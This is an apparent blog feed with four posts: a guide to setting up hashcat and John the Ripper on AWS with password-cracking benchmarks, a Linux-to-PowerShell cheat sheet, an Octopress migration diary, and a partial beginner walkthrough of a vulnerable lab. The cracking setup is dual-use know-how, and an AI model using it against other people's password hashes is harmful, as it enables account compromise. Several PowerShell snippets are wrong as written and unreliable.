<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Things all the hacking]]></title>
  <link href="http://blog.nullmode.com/atom.xml" rel="self"/>
  <link href="http://blog.nullmode.com/"/>
  <updated>2015-03-22T01:45:53+00:00</updated>
  <id>http://blog.nullmode.com/</id>
  <author>
    <name><![CDATA[NullMode]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Password Cracking with Amazon Web Services - 36 Cores]]></title>
    <link href="http://blog.nullmode.com/blog/2015/03/17/36-core-aws-john/"/>
    <updated>2015-03-17T12:00:00+00:00</updated>
    <id>http://blog.nullmode.com/blog/2015/03/17/36-core-aws-john</id>
    <content type="html"><![CDATA[<p>As part of a project recently I got the chance to play with a 36 core instance on AWS (c4.8xlarge) for some password cracking related activities. To get hashcat and john up and running with multi-core is a little fiddly (it&rsquo;s not download and crack), so I thought I&rsquo;d document the setup and show some benchmarks with <a href="http://hashcat.net/hashcat/">hashcat</a> and <a href="http://www.openwall.com/john/">John the Ripper</a> utilising 36 cores. In order to select the 36 core instance you&rsquo;ll need to use a HVM (hardware virtual machine) enabled machine image. I used the Amazon Linux image.</p>

<!-- more -->


<p>I&rsquo;ll be assuming you can reach the point of setup where you are logging into your freshly set-up machine on AWS (if you&rsquo;re following along to set this up yourself). If you need help setting up a box on AWS, there&rsquo;s a <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EC2_GetStarted.html">getting started</a> guide from amazon to get you going.</p>

<p>The bench marks from this will differ depending on attack type, rules, and what hash type is being attacked, so take these results with a pinch of sale. Both hashcat and john both have different benchmark outputs. John only shows the benchmarks of the algorithms it was compiled with (as far as i&rsquo;m away).</p>

<h2>hashcat</h2>

<p>Usually the GPU version of hashcat is the tool of choice for me when it comes to password cracking. However, on this occasion I was interested in experimenting and benchmarking with CPU only.</p>

<h3>Setup</h3>

<p>The setup for multicore hashcat is pretty straight forward. Installing <code>libgmp3-dev</code>  was required in order to run multicore. Multiple core support is provided by default. You&rsquo;ll need to download <code>p7zip-full</code> to extract the download a bit further on (7z).</p>

<pre><code>sudo apt-get update
sudo apt-get install -y libgmp3-dev p7zip-full
</code></pre>

<p>After this it was just a case of downloading and installing the latest version of <a href="http://hashcat.net/hashcat/">hashcat</a>.</p>

<pre><code>wget http://hashcat.net/files/hashcat-0.49.7z
7z x hashcat-0.49.7z
</code></pre>

<p>The EULA needed to be accepted proceeding with using hatchet, here&rsquo;s a quick copy paste way to get the prompt up, I guess:</p>

<pre><code>./hashcat-cli64.bin -a 0 -m 0 examples/A0.M0.hash examples/A0.M0.word
</code></pre>

<p>&lsquo;OH NO! I got this!&rsquo;</p>

<pre><code>./hashcat-cli64.bin: error while loading shared libraries: libgmp.so.10: cannot open shared object file: No such file or directory
</code></pre>

<p>No you didn&rsquo;t, because you did the apt-get install from earlier&hellip;</p>

<h3>Benchmarks</h3>

<p>Benchmarking is simple enough with hatchet using the <code>--benchmark</code> or <code>-b</code> option. Here&rsquo;s the output (it&rsquo;s a bit long):</p>

<pre><code>./hashcat-cli64.bin

Initializing hashcat v0.49 with 36 threads and 32mb segment-size...

Device...........: Intel(R) Xeon(R) CPU E5-2666 v3 @ 2.90GHz
Instruction set..: x86_64
Number of threads: 36

Hash type: MD4
Speed/sec: 442.76M words

Hash type: MD5
Speed/sec: 380.02M words

Hash type: SHA1
Speed/sec: 218.86M words

Hash type: SHA256
Speed/sec: 110.37M words

Hash type: SHA512
Speed/sec: 43.28M words

Hash type: SHA-3(Keccak)
Speed/sec: 42.93M words

Hash type: GOST R 34.11-94
Speed/sec: 24.99M words

Hash type: SHA-1(Base64), nsldap, Netscape LDAP SHA
Speed/sec: 219.19M words

Hash type: SSHA-1(Base64), nsldaps, Netscape LDAP SSHA
Speed/sec: 197.88M words

Hash type: descrypt, DES(Unix), Traditional DES
Speed/sec: 10.54M words

Hash type: md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
Speed/sec: 407.68k words

Hash type: sha256crypt, SHA256(Unix)
Speed/sec: 21.27k words

Hash type: sha512crypt, SHA512(Unix)
Speed/sec: 8.49k words

Hash type: bcrypt, Blowfish(OpenBSD)
Speed/sec: 25.86k words

Hash type: Oracle 11g/12c
Speed/sec: 197.28M words

Hash type: NTLM
Speed/sec: 370.22M words

Hash type: DCC, mscash
Speed/sec: 221.91M words

Hash type: NetNTLMv1-VANILLA / NetNTLMv1+ESS
Speed/sec: 356.85M words

Hash type: NetNTLMv2
Speed/sec: 67.54M words

Hash type: EPiServer 6.x &lt; v4
Speed/sec: 180.62M words

Hash type: EPiServer 6.x &gt; v4
Speed/sec: 100.69M words

Hash type: MSSQL(2000)
Speed/sec: 177.41M words

Hash type: MSSQL(2005)
Speed/sec: 181.14M words

Hash type: MSSQL(2012)
Speed/sec: 41.34M words

Hash type: MySQL323
Speed/sec: 624.65M words

Hash type: MySQL4.1/MySQL5
Speed/sec: 120.88M words

Hash type: Oracle 11g/12c
Speed/sec: 197.77M words

Hash type: OSX v10.4, v10.5, v10.6
Speed/sec: 200.04M words

Hash type: OSX v10.7
Speed/sec: 42.08M words

Hash type: OSX v10.8 / v10.9
Speed/sec: 655 words

Hash type: Android PIN
Speed/sec: 204.72k words

Hash type: scrypt
Speed/sec: 979 words

Hash type: Cisco-PIX MD5
Speed/sec: 337.08M words

Hash type: Cisco-ASA MD5
Speed/sec: 311.25M words

Hash type: Cisco-IOS SHA256
Speed/sec: 110.45M words

Hash type: Cisco $9$
Speed/sec: 6.95k words

Hash type: WPA/WPA2
Speed/sec: 18.01k words

Hash type: IKE-PSK MD5
Speed/sec: 75.24M words

Hash type: IKE-PSK SHA1
Speed/sec: 34.08M words

Hash type: Password Safe v3
Speed/sec: 58.87k words

Hash type: AIX {ssha1}
Speed/sec: 2.27M words

Hash type: Radmin2
Speed/sec: 180.72M words

Hash type: HMAC-MD5 (key = $pass)
Speed/sec: 135.34M words

Hash type: HMAC-MD5 (key = $salt)
Speed/sec: 233.42M words

Hash type: HMAC-SHA1 (key = $pass)
Speed/sec: 66.68M words

Hash type: HMAC-SHA1 (key = $salt)
Speed/sec: 112.10M words

Hash type: HMAC-SHA256 (key = $pass)
Speed/sec: 30.67M words

Hash type: HMAC-SHA256 (key = $salt)
Speed/sec: 58.05M words

Hash type: HMAC-SHA512 (key = $pass)
Speed/sec: 11.45M words

Hash type: HMAC-SHA512 (key = $salt)
Speed/sec: 22.37M words

Hash type: IPMI2 RAKP HMAC-SHA1
Speed/sec: 68.25M words

Hash type: Half MD5
Speed/sec: 309.78M words

Hash type: Double MD5
Speed/sec: 170.11M words

Hash type: GRUB 2
Speed/sec: 2.33k words

Hash type: phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)
Speed/sec: 292.59k words

Hash type: Joomla &lt; 2.5.18
Speed/sec: 313.02M words

Hash type: osCommerce, xt:Commerce
Speed/sec: 318.75M words

Hash type: IPB2+, MyBB1.2+
Speed/sec: 142.57M words

Hash type: vBulletin &lt; v3.8.5
Speed/sec: 162.44M words

Hash type: SMF &gt; v1.1
Speed/sec: 200.07M words
</code></pre>

<h2>John the Ripper</h2>

<p>I compiled John from source so there were a few extra steps involved. If I try this again at some point i&rsquo;ll try and setup the community edition of John for some of the added functionality.</p>

<h3>Setup</h3>

<p>Since there&rsquo;s some compiling to do I grabbed build-essentail. libssl-dev is required for john.</p>

<pre><code>apt-get update
apt-get install build-essential make libssl-dev
</code></pre>

<p>Next I pulled down the latest release of john the ripper (1.8.0 at the time or writing) and extracted. If you&rsquo;re using these notes in the future you might have to change the URL below (or at least check to see if there&rsquo;s a newer version out).</p>

<pre><code>wget http://www.openwall.com/john/j/john-1.8.0.tar.gz
tar xvfz john*.tar.gz
</code></pre>

<p>Time to compile. The <code>OMPFLAGS</code> need to be uncommented in the make file.</p>

<pre><code>cd john*/src/
vi Makefile
</code></pre>

<p>The following lines needed changing&hellip;</p>

<pre><code># gcc with OpenMP
#OMPFLAGS = -fopenmp
# gcc with OpenMP on 32-bit x86 with    SSE2
#OMPFLAGS = -fopenmp -msse2
</code></pre>

<p>..to (lines uncommented):</p>

<pre><code># gcc with OpenMP
OMPFLAGS = -fopenmp
# gcc with OpenMP on 32-bit x86 with SSE2
OMPFLAGS = -fopenmp -msse2
</code></pre>

<p>After changing I saved the file then ran the following to compile.</p>

<pre><code>make clean linux-x86-64
</code></pre>

<p>With any luck the john binary will be in the run folder ready to be played with.</p>

<h3>Benchmarks</h3>

<p>John comes with a <code>--test</code> option for benchmarking.</p>

<pre><code>./john --test
Will run 36 OpenMP threads
Benchmarking: descrypt, traditional crypt(3) [DES 128/128 SSE2-16]... DONE
Many salts:     38810K c/s real, 1081K c/s virtual
Only one salt:  28225K c/s real, 785700 c/s virtual

Benchmarking: bsdicrypt, BSDI crypt(3) ("_J9..", 725 iterations) [DES 128/128 SSE2-16]... DONE
Many salts:     1358K c/s real, 37751 c/s virtual
Only one salt:  958464 c/s real, 27775 c/s virtual

Benchmarking: md5crypt [MD5 32/64 X2]... DONE
Raw:    318237 c/s real, 8881 c/s virtual

Benchmarking: bcrypt ("$2a$05", 32 iterations) [Blowfish 32/64 X2]... DONE
Raw:    25488 c/s real, 708 c/s virtual

Benchmarking: LM [DES 128/128 SSE2-16]... DONE
Raw:    88090K c/s real, 2462K c/s virtual

Benchmarking: AFS, Kerberos AFS [DES 48/64 4K]... DONE
Short:  520345 c/s real, 520345 c/s virtual
Long:   1702K c/s real, 1702K c/s virtual

Benchmarking: tripcode [DES 128/128 SSE2-16]... DONE
Raw:    16540K c/s real, 527567 c/s virtual

Benchmarking: dummy [N/A]... DONE
Raw:    81656K c/s real, 81008K c/s virtual

Benchmarking: crypt, generic crypt(3) [?/64]... DONE
Many salts:     3939K c/s real, 109467 c/s virtual
Only one salt:  3305K c/s real, 92308 c/s virtual
</code></pre>

<h2>Thoughts on AWS</h2>

<p>Some of the speeds reported aren&rsquo;t bad, but not great. Most decent GPUs will do much better against some of the easy algorithms such as MD5, NTLM etc.</p>

<p>Looking into spot instances on AWS (instances run at cheaper rates when available) could be an option for those automating a password cracking business in the cloud.</p>

<p>This was really just a close look at using a high core count on AWS. Maybe in the future i&rsquo;ll get around to delving a bit deeper into this approach to password cracking.</p>

<h2>The glory of htop</h2>

<p><img class="center" src="http://blog.nullmode.com/images/2015-03-17/htop.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting Personal With PowerShell: Linux to PowerShell]]></title>
    <link href="http://blog.nullmode.com/blog/2014/06/28/getting-personal-with-powershell/"/>
    <updated>2014-06-28T13:00:00+01:00</updated>
    <id>http://blog.nullmode.com/blog/2014/06/28/getting-personal-with-powershell</id>
    <content type="html"><![CDATA[<p>Running Windows as a main OS can be tough times for many hard core Linux users, especially when you want some command line power. PowerShell at first glance looks alien to some, but under closer inspection it&rsquo;s not a million miles away from what you can achieve in a Bash shell.</p>

<!-- more -->


<p>If you’re like me you&rsquo;ll have a few handy aliases that save a bit of time whilst working in your Linux environment. For example the below aliases save having to type out long commands that you may use quite often:</p>

<pre><code>alias lsa="ls -lsahS"

alias screen="screen -xRR"

alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias .....="cd ../../../..”

alias upd="sudo apt-get update"
alias upg="sudo apt-get upgrade"
alias ins="sudo apt-get install"
alias rem="sudo apt-get purge"
alias fix="sudo apt-get install -f"
</code></pre>

<p>If you find yourself dropping into a Linux virtual machine to use the command line functionality you may be surprised to learn that a lot of the same functionality can be achieved with PowerShell. PowerShell handles everything as an object which makes piping between commands very powerful. For example, if I want to return the full path for every file in the current directory I could do the following:</p>

<pre><code>Get-ChildItem | Select-Object fullname
</code></pre>

<p>Each file returned is piped to the select command to get the <strong>fullname</strong> attribute of the file object.</p>

<p>It&rsquo;s worth learning about the PowerShell equivalents of some of the commands you might run in a Linux shell. Below I&rsquo;ve put some of the more familiar Linux command line binaries and their PowerShell counterparts.</p>

<br />


<h4>Listing running processes</h4>

<p><strong>Linux</strong></p>

<pre><code>ps
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>get-process
</code></pre>

<br />


<h4>Stopping a process</h4>

<p><strong>Linux</strong></p>

<pre><code>kill calc.exe
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>get-process calc.exe | StopProcess
</code></pre>

<br />


<h4>Displaying a list of 1 to 10</h4>

<p><strong>Linux</strong></p>

<pre><code>seq 1 10
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>1..10
</code></pre>

<br />


<h4>Print the first 10 lines of a file</h4>

<p><strong>Linux</strong></p>

<pre><code>head -n10 file.txt
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>gc file.txt | select -first 10
</code></pre>

<br />


<h4>Print the last 10 lines of a file</h4>

<p><strong>Linux</strong></p>

<pre><code>tail -n10 file.txt
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>gc file.txt | select -last 10 
</code></pre>

<br />


<h4>Count the lines in a file</h4>

<p><strong>Linux</strong></p>

<pre><code>wc -l file.txt
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>gc file.txt | Measure-Object -Line 
</code></pre>

<br />


<h4>Print lines that contain the word “example”</h4>

<p><strong>Linux</strong></p>

<pre><code>grep example file.txt
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>Select-Text example file.txt
</code></pre>

<br />


<h4>Split file using &ldquo;:&rdquo; as a delimiter and print the second item</h4>

<p><strong>Linux</strong></p>

<pre><code>awk -F ":" '{print $1}' file.txt
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>gc file.txt | %{ $_.Split(':')[1]; }
</code></pre>

<br />


<h4>Replace the word “example” with “elpmaxe” in file.txt</h4>

<p><strong>Linux</strong></p>

<pre><code>cat file.txt | sed ’s/example/elpmaxe/‘
</code></pre>

<p><strong>PowerShell</strong></p>

<pre><code>gc test.txt | Select-String “example" | %{ $_ -replace ‘example', 'elpmaxe' }
</code></pre>

<br />


<p>There’s actually a lot of built in aliases in PowerShell already so if you find yourself loathing some long command string you might be pleased to know that their is probably already a shortcut for it already. You can find out what these are with the following command:</p>

<pre><code>Get-Alias
</code></pre>

<p>As you can see there are a few items in the list that would be familiar to you if you are from a Linux background. Aliases such as ls, cat and rm are just a few examples of aliases that you wont need to re-learn (or set up) for PowerShell. Remember that command at the start where I grabbed the full path for each file in the directory? That could have been simplified using these built in aliases.</p>

<pre><code>ls | select fullname
</code></pre>

<p>That&rsquo;s not so much of a pain to type is it?</p>

<h3>Setting up your PowerShell profile</h3>

<p>For practice I&rsquo;ll go through setting up the profile (mostly) in PowerShell. The PowerShell environment tries to load your profile information from the following file (may differ with different Windows operating systems):</p>

<pre><code>C:\Users\NullMode\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
</code></pre>

<p>This file location is stored in the PowerShell environment variable $PROFILE as seen below:</p>

<pre><code>echo $PROFILE
C:\Users\NullMode\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
</code></pre>

<p>Let&rsquo;s use this variable to create this file in this location:</p>

<pre><code>New-Item -type file -force $PROFILE
</code></pre>

<p>Hooray, we&rsquo;ve just made a PowerShell profile file.</p>

<h3>Adding aliases to our PowerShell profile file</h3>

<p>Let&rsquo;s open up that file from within PowerShell because we&rsquo;re gurus now:</p>

<pre><code>notepad $PROFILE
</code></pre>

<p>In a .bashrc/.bash_aliases file you can define functions that can be run as well as aliases, unfortunately this isn&rsquo;t possible with PowerShell. You must first define the function then use the New-Alias command to tie the function name to an alias that we can type into the prompt.</p>

<h5>With the open file let&rsquo;s add some aliases:</h5>

<p>How about a quick alias to run ipconfig:</p>

<pre><code>New-Alias ipconfig -value ip
</code></pre>

<p>If you want to do ipconfig /all the following would be required as you are supplying the name of the command and an argument:</p>

<pre><code>function ipconfig_all_function() {
    ipconfig /all
}
New-Alias -name ipa -value ipconfig_all_function
</code></pre>

<p>Change to your $HOME directory:</p>

<pre><code>cd_home_function() {
    cd $HOME
}
New-Alias -name home -value cd_home_function
</code></pre>

<p>Maybe a shortcut to open notepad if you&rsquo;re in a console window:</p>

<pre><code>New-Alias -name n -value notepad
</code></pre>

<p>Being lazy is cool remember:</p>

<pre><code>function exit_function() {
    exit
}
New-Alias -name x -value exit_function
</code></pre>

<p>Once you have some aliases in your profile file just save it and open a new PowerShell instance and test them out! You&rsquo;ll get an error if something is wrong in the file so you&rsquo;ll be able to correct yourself.</p>

<p>The aliases above are pretty simple. Here is one I&rsquo;ve made that sets up a git repository with some local configuration settings. This can be useful if you have multiple git servers using different user names and e-mails assigned to them.</p>

<pre><code>function gitinb_function() {
    git init
    git config --local user.name NullModeBitbucket
    git config --local user.email TheRealDeal@DealOrNoDeal.cn
}
New-Alias -name gitinb -value gitin_function

function giting_function() {
    git init
    git config --local user.name NullModeGithub
    git config --local user.email TheRealDeal@DealOrNoDeal.cn
}
New-Alias -name giting -value gitin_function
</code></pre>

<h3>More customization</h3>

<p>Here are a couple of places you can go to read about aliases and profile customization that you may wish to incorporate into your own profile file:</p>

<ul>
<li><a href="http://stackoverflow.com/questions/138144/whats-in-your-powershell-profile-ps1file">What&rsquo;s in your Powershell profile.ps1file?</a> &ndash; some cool examples from other PowerShell users</li>
<li><a href="http://www.howtogeek.com/50236/customizing-your-powershell-profile/">Customizing your PowerShell Profile</a> &ndash; A similar guide to this that has a nice example of pimping out the terminal itself</li>
</ul>


<h3>Bonus information!</h3>

<p>There&rsquo;s some special locations you can get to within PowerShell. I thought I&rsquo;d include them here while I remember as maybe someone will find them useful.</p>

<p>View the windows environment variables:</p>

<pre><code>cd env:
ls
</code></pre>

<p>View the Windows HIVE files:</p>

<pre><code>cd HKLM:
ls
</code></pre>

<p>If you want to find out about a particular item in one of of these locations you can do the following (remembering that past the tabbing through the items is possible):</p>

<pre><code>echo $Env:OS
</code></pre>

<h3>Shout-outs</h3>

<p>Thanks to <a href="https://twitter.com/lllamaboy" title="@lllamaboy">@lllamaboy</a> for giving me the first steps on setting up a python $PROFILE and letting me in on the whole special location thing.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Move to Octopress]]></title>
    <link href="http://blog.nullmode.com/blog/2014/05/25/my-move-to-octopress/"/>
    <updated>2014-05-25T14:00:00+01:00</updated>
    <id>http://blog.nullmode.com/blog/2014/05/25/my-move-to-octopress</id>
    <content type="html"><![CDATA[<p>So, a friend of mine was talking about this thing called Octopress and how he was moving his blogspot content across to it. I toiled for a while thinking that it wasn&rsquo;t something I needed to do right now, but in the end I gave in and spent an evening moving my own blog across (I only had 2 posts before this so I assumed it would be quick &ndash; and I was right). There are plenty of blogs describing the process of setting up an Octopress site using GitHub pages, so rather than regurgitate others material I&rsquo;ll talk about the bits that I got stuck with. But first&hellip;</p>

<!-- more -->


<h3>Why did I move?</h3>

<p>It&rsquo;s not hard to notice that I&rsquo;ve only got two other posts on this blog. There&rsquo;s a couple reasons for that. The main reason is I don&rsquo;t like to repeat content that&rsquo;s already out on the net. I&rsquo;ve had a few things to talk about previously but after having a look about it&rsquo;s already been done before, so why copy what&rsquo;s out there? Secondly, the sort of posts that I would like to write (like my De-Ice guide) would be in depth. Whilst I do enjoy blogging, using blogspot was a pain to use. Making everything look pretty using the formatting in blogspot was tedious and slow making me reluctant/too lazy to write big blog posts.</p>

<p>Not so long ago I had been updating my README.md files in<a href="https://github.com/NullMode"> my GitHub repositories</a> using a tool called <a href="http://markdownpad.com/">MarkdownPad2</a>. In the git fashion, I was writing the markdown locally, seeing the output of the markdown in MarkdownPad before pushing. After finding out how Octopress works the way I could push blog posts out was more appealing: I could create pages offline, work on them offline and see the preview of the generated output offline all before pushing it GitHub and using a very glorified notepad-ish tool. All along with simple and to the point formatting. Hazzah.</p>

<h3>What is Octopress anyway?</h3>

<p>For those who don&rsquo;t know what Octopress is, here&rsquo;s a small run down. Octopress is a Ruby on Rails application that is essentially a framework for Jekyll: a static website generator. This generated content can then be pushed up to a repository on GitHub, and then you can use GitHub pages to host it. Visiting the <a href="http://octopress.org/" title="Octopress">Octopress</a> site will give you some more information about Octopress.</p>

<h3>So what is markdown?</h3>

<p>Markdown is language created for the sole purpose allowing people <a href="http://daringfireball.net/projects/markdown/" title="John Gruber on Markdown">“to write using an easy-to-read, easy-to-write plain text format, and optionally convert it to structurally valid XHTML (or HTML)”.</a> The <a href="http://daringfireball.net/projects/markdown/syntax" title="Syntax">syntax</a> is so basic that makes knocking up a simple page (such as readme files for GitHub repositories) trivial.</p>

<h3>Windows installation</h3>

<p>The main bulk of my installation came from following the two guides below. This includes setting up: titles, a custom theme, adding posts and adding pages:</p>

<ol>
<li><a href="http://octopress.org/docs/blogging/">http://octopress.org/docs/blogging/</a></li>
<li><a href="http://paulsturgess.co.uk/blog/2013/04/24/hello-octopress-and-github-pages/">http://paulsturgess.co.uk/blog/2013/04/24/hello-octopress-and-github-pages/</a></li>
</ol>


<p>Since I had ruby mostly installed on my system all I needed was to download and install the DevKit which is required for Octopress. The download for DevKit can be found on <a href="http://rubyinstaller.org/downloads" title="Ruby downloads">Ruby Installer</a> website (make sure you get the correct version for your Ruby install).</p>

<h3>Bundle exec</h3>

<p>On my shell in windows I was getting an error because the wrong version of rake was installed. Anyone who knows what they&rsquo;re going with Ruby knows that they can run the required version by using bundle exec (I had to look this up because I don&rsquo;t normally work with Ruby):</p>

<pre><code>&gt; rake new_post["My move to Octopress"]
You have already activated rake 10.1.0, but your Gemfile requires rake 0.9.2.2.
Using bundle exec may solve this.
</code></pre>

<p>Simply prepend your commands within the application with &ldquo;bundle exec&rdquo;, like so:</p>

<pre><code>&gt; bundle exec rake new_post["My move to Octopress"]
</code></pre>

<h3>Adding a twitter recent tweet box</h3>

<p>After being disappointed that a twitter box didn&rsquo;t appear after filling in my details in the configuration file I was pointed to <a href="http://blog.jmac.org/blog/2013/03/30/putting-twitter-back-into-octopress/" title="Jmac - Putting Twitter Back Into Octopress">Jmac&rsquo;s</a> post on how to put twitter back into Octopress. The guide was pretty easy to follow, although I removed the following line from the twitter.html page as it wasn&rsquo;t required for my theme:</p>

<p><code>&lt;h1&gt;Twitter&lt;/h1&gt;
</code></p>

<h3>Custom favicon in Octopress</h3>

<p>I wanted to use my old blog&rsquo;s favicon on my Octopress site. Presumably it would be a copy and paste win, however Octopress likes to have the favicon as a png file (yes you could edit some html to include the ico, but the following was faster for my lazy brain somehow). The main solution was found at the end of this <a href="https://brianbuccola.github.io/blog/2012-11-29-how-to-change-the-favicon-in-octopress.html" title="How to Change the Favicon in Octopress">post</a>. Firstly I went to my old site (before the CNAME part below if you skipped ahead) and downloaded the favicon: <a href="http://blog.nullmode.com/favicon.ico.">http://blog.nullmode.com/favicon.ico.</a> I then needed to convert my .ico to a .png file. Since I couldn&rsquo;t be bothered to use some fancy image library for converting the .ico which had been mentioned in a few guides, I simply went to <a href="http://converticon.com/" title="Convert your ico files">http://converticon.com/</a> for the conversion. With this new favicon.png in hand, I added it to my sources/ folder and ran <code>bundle exec rake generate</code> which added the favicon to my generated code.</p>

<h3>Pointing a custom domain to your GitHub Pages site</h3>

<p>Most people want to have a custom domain pointing to their blog. The steps for this are really simple, <a href="http://gangmax.me/blog/2012/07/02/add-cname-for-my-octopress-github-pages/" title="Add CNAME for My Octopress Github Pages">GangMax</a> and <a href="https://help.github.com/articles/setting-up-a-custom-domain-with-github-pages" title="Setting up a custom domain with GitHub Pages">GitHub</a> are both good guides on how to do this. However, remember how I said I was on windows? On my command line (PowerShell by default) I ran the following:</p>

<pre><code>&gt; echo blog.nullmode.com &gt; sources/CNAME    
</code></pre>

<p>That should be okay? Right? Well no. When I deployed my site with the new CNAME file I got an e-mail from GitHub:</p>

<pre><code>The page build completed successfully, but returned the following warning:

Bad CNAME format: ÿþb l o g . n u l l m o d e . c o m
</code></pre>

<p>Weird right? Well, it turns out that when piping into a file with PowerShell it uses the encoding <code>UCS 2 Little Endian</code> (checking with Notepad++ on the encoding tab). To fix this I done the following using Notepad++: open said file, clicking <code>Encoding</code>, then selecting <code>Convert to UTF-8 without BOM</code> and saving. It turns out that using the old fashioned Command Prompt for piping the CNAME into the CNAME file uses the correct encoding. Committing and redeploying after the changing the encoding fixed this error.</p>

<h3>List of links</h3>

<ul>
<li><a href="http://markdownpad.com/">http://markdownpad.com/</a></li>
<li><a href="http://octopress.org/docs/blogging/">http://daringfireball.net/projects/markdown/</a></li>
<li><a href="http://daringfireball.net/projects/markdown/syntax">http://daringfireball.net/projects/markdown/syntax</a></li>
<li><a href="http://octopress.org/docs/blogging/">http://octopress.org/docs/blogging/</a></li>
<li><a href="http://paulsturgess.co.uk/blog/2013/04/24/hello-octopress-and-github-pages/">http://paulsturgess.co.uk/blog/2013/04/24/hello-octopress-and-github-pages/</a></li>
<li><a href="http://rubyinstaller.org/downloads">http://rubyinstaller.org/downloads</a></li>
<li><a href="http://blog.jmac.org/blog/2013/03/30/putting-twitter-back-into-octopress/">http://blog.jmac.org/blog/2013/03/30/putting-twitter-back-into-octopress/</a></li>
<li><a href="https://brianbuccola.github.io/blog/2012-11-29-how-to-change-the-favicon-in-octopress.html">https://brianbuccola.github.io/blog/2012-11-29-how-to-change-the-favicon-in-octopress.html</a></li>
<li><a href="http://converticon.com/">http://converticon.com/</a></li>
<li><a href="http://gangmax.me/blog/2012/07/02/add-cname-for-my-octopress-github-pages/">http://gangmax.me/blog/2012/07/02/add-cname-for-my-octopress-github-pages/</a></li>
<li><a href="https://help.github.com/articles/setting-up-a-custom-domain-with-github-pages">https://help.github.com/articles/setting-up-a-custom-domain-with-github-pages</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[De-ICE S1.100 (Level 1) - A Beginners Guide]]></title>
    <link href="http://blog.nullmode.com/blog/2013/10/31/de-ice-s1-dot-100-level-1-a-beginners-guide/"/>
    <updated>2013-10-31T23:00:00+00:00</updated>
    <id>http://blog.nullmode.com/blog/2013/10/31/de-ice-s1-dot-100-level-1-a-beginners-guide</id>
    <content type="html"><![CDATA[<h3>About De-ICE S1.100 (Level 1)</h3>

<p>This machine is very good for those looking to get their teeth into learning some simple penetration testing techniques. It allows newcomers to have a play with some common tools that are used in many penetration tests. In this guide I will to go into some detail to help beginners understand these tools. My aim is to inform you of why a chosen tool was been picked for the task and how to use the tool at a basic level.</p>

<!-- more -->


<h3>Things to Remember</h3>

<p>Throughout the guide I will reference several tools. If you wish to find out more about the tool and the options is has available, the following command should aid you. Use it whenever you get stuck with a application.</p>

<h3>Example:</h3>

<pre><code>man &lt;application&gt;
man netdiscover
man nmap 
</code></pre>

<p>If you still find yourself stuck or have questions then crack out Google. Research, take notes, and learn. Do not take short cuts by not reading sections or dismissing stuff you don&rsquo;t understand, you will fail in the long run. People will also be less likely to help you if you&rsquo;ve not given a challenge your best shot already.</p>

<h3>Setup</h3>

<p>Download information and network setup can be found on Vulnhub. I typically recommend running Kali or Backtrack in one virtual machine, then the De-Ice in another. In this guide I use Kali Linux. If you get stuck on setting up your virtual machines check out Vulnhub&rsquo;s comprehensive guide. For this particular machine you will be required to have your attacking box to be in the 192.168.1.xxx network range.</p>

<h3>Enumeration</h3>

<p>Throughout this blog post I&rsquo;m going to use this word a lot. In computer security enumeration is the the process of finding out as much information about a target as possible. Sorting through the information to prioritise possible leads which may help with a successful breach. This gathering of information is the key to a successful attack and I cannot stress enough how important this is.</p>

<h3>Target Discovery</h3>

<p>In our case we can&rsquo;t target the machine yet because we don&rsquo;t know the machine&rsquo;s IP address. Therefore finding the IP is the first task. If the setup of the virtual machine went according to plan you should be able to run the netdiscover command to scan for active IP addresses on the same subnet.</p>

<pre><code>root@kali ~$ netdiscover
Currently scanning: 192.168.35.0/16   |   Screen View: Unique Hosts           

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.1.1     00:50:56:c0:00:01    01    060   VMWare, Inc.                 
 192.168.1.100   00:0c:29:49:2d:4c    01    060   VMware, Inc.                 
 192.168.1.254   00:50:56:f5:1b:d6    01    060   VMWare, Inc.                 
</code></pre>

<p>The command netdiscover sends out ARP (..) requests to locate active machines on a network subnet. ARP is used to aid communication in IP based networked. ARP requests are sent to confirm a nodes MAC address so communication between two machines can occur. This tool is sending out ARP requests for each IP address in each subnet range that is scanned. If a node responds with a MAC address it means that a machine is alive on the requested IP address. This tool also works through switched networks, and when the above command is run you will see it go through multiple subnets to check for active machines.</p>

<p>As you can see we receive a response from three machines. What we now want to do is find out which is our target box. In this case the machine has been hard coded with an IP address (192.168.1.100), but it&rsquo;s good practice to scan all the machines found (which is what you&rsquo;d do in a real life situation!).</p>

<h3>Service Enumeration</h3>

<p>The first and arguably the most important part of any penetration test is scanning the machine to find which services are running on it.  Some of the questions you will need to answer are:</p>

<ul>
<li>What services are running on the target?</li>
<li>What version are they running?</li>
<li>Are there any plugins attached to the services?</li>
<li>What versions are the plugins?</li>
<li>Are you able to identify any service misconfiguration?</li>
<li>Is there a web server?</li>
<li>Is it off the shelf? (wordpress)</li>
<li>Version?</li>
<li>Plugins and Versions?</li>
<li>Misconfigured?</li>
</ul>


<p>Enumeration is the key!  Don&rsquo;t get ahead of yourself by attacking the box the moment you find something that could be exploited. This is the mistake a lot of new comers make and they end up going back to the start.</p>

<p>We are going to use nmap to scan each address. The nmap program is one of the bread and butter applications you need to know about. It has a wide array of functions and options which can be used in different circumstances and situations.</p>

<p>To start with, let&rsquo;s scan the found addresses. We can use a &ldquo;,&rdquo; to add multiple IP addresses into one scan like so:</p>

